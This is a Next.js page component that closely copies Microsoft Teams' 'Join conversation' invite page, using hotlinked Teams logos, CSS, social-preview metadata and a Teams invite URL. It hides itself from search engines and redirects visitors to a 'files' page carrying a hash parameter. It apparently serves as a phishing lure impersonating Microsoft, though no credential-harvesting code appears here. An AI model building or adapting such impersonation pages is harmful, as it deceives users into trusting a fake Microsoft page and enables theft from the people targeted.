import { useRouter } from 'next/router';

const videoStyle = {
  objectFit: 'cover',
  width: '100vw',
  height: '100vh',
  position: 'fixed',
  top: '0',
  left: '0',
  zIndex: '-1',
};

export default function FileShare() {
  const router = useRouter();

  const { hash } = router.query;

  const navigateToFiles = () => {
    location.href = `files?hash=${hash}`;
  };

  return (
    <>
      <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="googlebot" content="noindex, nofollow" />
        <meta name="robots" content="noindex, nofollow" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <link
          rel="shortcut icon"
          href="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon.ico"
          type="image/x-icon"
        />
        <link
          rel="apple-touch-icon"
          href="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon-96x96.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="16x16"
          href="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon-16x16.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="32x32"
          href="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon-32x32.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="96x96"
          href="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon-96x96.png"
        />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="Join conversation on Teams" />
        <meta
          property="og:url"
          content="https://teams.live.com/l/invite/FEAW9mOugckr2tkIAE"
        />
        <meta
          property="og:image"
          content="https://statics.teams.cdn.live.net/hashedassets-launcher/og/invite/preview.png"
        />
        <meta
          property="og:image:secure-url"
          content="https://statics.teams.cdn.live.net/hashedassets-launcher/og/invite/preview.png"
        />
        <meta property="og:image:width" content="1200" />
        <meta property="og:image:height" content="630" />
        <meta property="twitter:card" content="summary_large_image" />
        <meta
          property="twitter:url"
          content="https://teams.live.com/l/invite/FEAW9mOugckr2tkIAE"
        />
        <meta property="twitter:title" content="Join conversation on Teams" />
        <meta
          property="twitter:image"
          content="https://statics.teams.cdn.live.net/hashedassets-launcher/og/invite/preview.png"
        />
        <meta property="og:site_name" content="Microsoft Teams" />
        <meta
          property="og:image"
          content="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon-96x96.png"
        />
        <title>Join conversation</title>
        <link
          href="https://statics.teams.cdn.live.net/hashedcss-launcher/launcher.31658ab6731c3e22358f.css"
          rel="stylesheet"
          nonce="[[random]]"
        />
      </head>
      <body>
        <div id="launcherApp">
          <div id="rootViewV2">
            <div class="modernViewContainer noShimmer">
              <div id="container">
                <div class="modernViewRenderer">
                  <div class="modernLifeSimplifiedView">
                    <div class="mainActionsContent">
                      <div class="banner"></div>
                      <div class="headerContainer">
                        <div class="logoContainer">
                          <img
                            class="logo "
                            src="https://statics.teams.cdn.live.net/hashedassets-launcher/v2/logo_teams.2da5b2c1a6861ba76de6c658322f4626.svg"
                            aria-hidden="true"
                          />
                        </div>
                      </div>
                      <div class="contentContainer">
                        <div class="title">
                          Join the conversation on Microsoft Teams
                        </div>
                        <div class="description"></div>
                      </div>
                      <div class="actionsContainer">
                        <div class="buttonsContainer">
                          <button
                            aria-label="Join meeting from this browser"
                            class="btn primary "
                            data-tid="joinOnWeb"
                          >
                            <div class="text">
                              <h3>Continue on this browser</h3>
                            </div>
                          </button>
                          <button
                            aria-label="Open Teams app to join a meeting"
                            class="btn secondary "
                            data-tid="joinInApp"
                          >
                            <div class="text">
                              <h3>Join on the Teams app</h3>
                            </div>
                          </button>
                        </div>
                      </div>
                    </div>
                    <div class="secondaryActionsContent">
                      <div class="secondaryAction">
                        <img
                          src="https://statics.teams.cdn.live.net/hashedassets-launcher/v2/logo_teams.2da5b2c1a6861ba76de6c658322f4626.svg"
                          class="img"
                          aria-hidden="true"
                        />
                        <div class="text" />
                        <p>
                          Don’t have the app?
                          <br />
                          <a
                            href="#"
                            data-tid="download"
                            aria-label="Download Teams application"
                          >
                            Download it now
                          </a>
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="disclaimer" role="contentinfo">
              <div class="view centered">
                <span class="teamsLogo">
                  <img
                    src="https://statics.teams.cdn.live.net/hashedassets-launcher/v3/microsoft_logo.3c5fb2e769272b22e31e2535162f6a38.svg"
                    aria-hidden="true"
                  />
                  <span class="hideText">Microsoft Teams</span>
                </span>
                <a
                  href="https://go.microsoft.com/fwlink/?LinkId=521839"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy and cookies
                </a>
                <a
                  href="attribution.txt"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Third-party disclosures
                </a>
              </div>
            </div>
          </div>
        </div>
        <noscript>
          <img
            alt=""
            width="1"
            height="1"
            src="//c.microsoft.com/trans_pixel.aspx"
          />
        </noscript>
      </body>
    </>
  );
}
